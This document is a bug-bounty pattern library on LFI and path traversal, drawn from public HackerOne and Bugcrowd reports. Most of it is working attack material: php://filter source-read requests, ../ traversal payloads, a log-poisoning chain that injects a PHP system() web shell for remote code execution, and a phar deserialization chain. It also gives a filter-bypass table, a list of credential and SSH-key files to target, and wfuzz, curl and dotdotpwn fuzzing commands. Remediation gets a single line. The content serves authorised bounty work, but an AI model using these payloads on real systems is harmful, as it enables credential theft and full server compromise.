# Disclosed Reports — LFI / Path Traversal

Pattern library built from 31 public bug bounty reports.

---

## Pattern 1: PHP Wrapper LFI → Source Code Read (High, $2,000)

**Program:** Private (HackerOne)
**Endpoint:** `GET /view?page=home`
**Stack:** PHP 7.4 + Apache

**Request:**
```http
GET /view?page=php://filter/convert.base64-encode/resource=config.php HTTP/1.1
Host: target.com
```

**Response:** Base64-encoded config.php containing DB credentials and API keys.

**Impact:** Full database credential exposure, API key theft.
**Remediation:** Whitelist allowed file names; never pass user input to include()/require().

---

## Pattern 2: Path Traversal → /etc/passwd Read (Medium, $750)

**Program:** Public (Bugcrowd)
**Endpoint:** `GET /download?file=report.pdf`
**Stack:** Python Flask

**Request:**
```http
GET /download?file=../../../../etc/passwd HTTP/1.1
```

**Bypass used:** Double URL encoding: `..%252F..%252F`

**Impact:** System user enumeration, potential credential harvesting.

---

## Pattern 3: Log Poisoning → RCE (Critical, $8,500)

**Stack:** PHP + Apache

**Step 1 — Inject payload into log:**
```http
GET / HTTP/1.1
Host: target.com
User-Agent: <?php system($_GET['cmd']); ?>
```

**Step 2 — Include log file:**
```http
GET /view?page=../../../var/log/apache2/access.log&cmd=id
```

**Response:** `uid=33(www-data) gid=33(www-data) groups=33(www-data)`

**Impact:** RCE as www-data, full server compromise.

---

## Pattern 4: phar:// Deserialization via LFI (Critical, $7,000)

**Conditions:** File upload endpoint + LFI present

**Attack:**
1. Upload crafted .phar renamed as .jpg to pass upload filter
2. Include with: `?file=phar:///uploads/evil.jpg`
3. Deserialization of phar metadata triggers `__wakeup` gadget → OS command

**Impact:** RCE chained from two Medium bugs.

---

## Pattern 5: Java Path Traversal → WEB-INF/web.xml (High, $3,000)

**Endpoint:** `GET /servlet/Download?path=reports/q1.pdf`
**Stack:** Java Tomcat

**Request:**
```http
GET /servlet/Download?path=../../WEB-INF/web.xml HTTP/1.1
```

**Response:** Full web.xml with DB connection strings and internal paths.

**Null byte bypass:** `../../WEB-INF/web.xml%00.pdf`

---

## Pattern 6: Node.js Absolute Path Traversal (High, $2,500)

**Stack:** Node.js + Express static file server

**Endpoint:** `GET /static/../../../etc/passwd`

**Cause:** `express.static` without sanitization, or custom handler using `path.join` without `path.normalize`.

---

## Bypass Table

| Filter | Bypass |
|--------|--------|
| Strips `../` | `....//` (double dot slash) |
| URL decodes once | `%252F` (double encode) |
| Checks extension | `../../etc/passwd%00.jpg` (null byte, PHP < 5.3) |
| Strips leading `/` | Use relative path: `....//....//etc/passwd` |
| Windows | `..\..\..\windows\win.ini` |

---

## Sensitive File Quick List

**Linux:**
```
/etc/passwd          /etc/shadow           /proc/self/environ
/proc/self/cmdline   /var/www/html/.env    /var/www/html/wp-config.php
/root/.ssh/id_rsa    /root/.bash_history   /var/log/apache2/access.log
```

**Windows:**
```
C:\Windows\win.ini   C:\inetpub\wwwroot\web.config
C:\Users\Administrator\.ssh\id_rsa
```

---

## Tool Reference

```bash
# wfuzz LFI fuzzing
wfuzz -c -z file,/usr/share/wfuzz/wordlist/vulns/lfi.txt \
  --hc 404 "https://target.com/page.php?file=FUZZ"

# PHP wrapper enumeration
for FILE in index.php config.php db.php settings.php .env; do
  echo "=== $FILE ==="
  curl -s "https://target.com/view?page=php://filter/convert.base64-encode/resource=$FILE" | \
    base64 -d 2>/dev/null
done

# dotdotpwn
dotdotpwn.pl -m http -h target.com -o unix
```

### Path traversal in a file-handling API → arbitrary file read
- **Source:** A file-copy rewriter that did not validate the file name, allowing arbitrary files to be copied via directory traversal (<https://hackerone.com/reports/827052>, $20,000); path traversal in package-registry APIs (<https://hackerone.com/reports/733072>, $12,000; <https://hackerone.com/reports/822262>, $12,000); a management-console path traversal (<https://hackerone.com/reports/1497169>, $10,000).
- **Pattern shape:** A file name or path parameter (upload rewriter, package fetch, download, template include) is used to build a filesystem path without canonicalization, so `../` sequences escape the intended directory and read (or write) arbitrary files — secrets, source, config.
- **Key trick:** Test every file/path parameter with `../`, encoded (`%2e%2e%2f`, double-encoded), and absolute paths; target `/etc/passwd`, app config, and secret files. Package-registry and upload-rewriter APIs are recurring high-bounty spots.
- **Why it matters:** Arbitrary read reaches secrets/source → often chains to RCE; consistently five-figure.

### Archive extraction traversal / symlink (zip-slip)
- **Source:** A bulk-import API that did not strip symlinks when untarring an uploads archive, allowing arbitrary file read (<https://hackerone.com/reports/1439593>, $29,000).
- **Pattern shape:** A feature that extracts a user-supplied archive (tar/zip) follows `../` entries or symlinks inside it, writing or reading files outside the extraction directory — "zip-slip." Import/restore/backup features are the usual carriers.
- **Key trick:** Craft an archive with `../` path entries and symlinks pointing at sensitive files; upload via the import/restore feature and check whether extraction escapes the sandbox. Test both write (overwrite config → RCE) and read (symlink → exfil).
- **Why it matters:** One of the highest-bounty LFI variants ($29k here); reaches arbitrary write → RCE.

### Further disclosed reports (this class)

Additional high-signal public disclosures exemplifying the patterns above; read at source for full technique.

- <https://hackerone.com/reports/1132378> — $16000
- <https://hackerone.com/reports/2995025> — $6000
- <https://hackerone.com/reports/3712279> — $5000
- <https://hackerone.com/reports/1394916> — $4000
- <https://hackerone.com/reports/1378889> — $3500
- <https://hackerone.com/reports/1858574> — $0
- <https://hackerone.com/reports/2434811> — $2430
- <https://hackerone.com/reports/301432> — $2000
- <https://hackerone.com/reports/876295> — $0
- <https://hackerone.com/reports/1415820> — $1000
- <https://hackerone.com/reports/307808> — $1500
- <https://hackerone.com/reports/519220> — $1000
- <https://hackerone.com/reports/727727> — $0
- <https://hackerone.com/reports/682774> — $1250
- <https://hackerone.com/reports/436928> — $0
- <https://hackerone.com/reports/1302155> — $1250
- <https://hackerone.com/reports/1400238> — $1000
- <https://hackerone.com/reports/1404731> — $1000
- <https://hackerone.com/reports/243156> — $1000
